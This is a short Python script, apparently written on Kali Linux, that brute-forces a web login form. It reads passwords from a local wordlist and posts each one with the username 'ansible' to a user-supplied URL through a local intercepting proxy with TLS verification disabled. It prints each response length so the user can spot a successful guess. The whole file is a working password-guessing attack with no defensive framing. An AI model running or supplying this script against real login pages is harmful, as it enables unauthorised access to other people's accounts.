#!/usr/bin/python3
from urllib import response
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = input("Enter the url:")

file2 = open('/home/kali/password.txt','r')

username = 'ansible'

for password in file2.readlines():

    password = password.strip("\n")

    data = {'username':username, 'password':password, "Log in":'submit'}

    send_data_url = requests.post(url, data=data,proxies=proxies,verify=False)

    print(len(send_data_url.content))

        

    


    





    
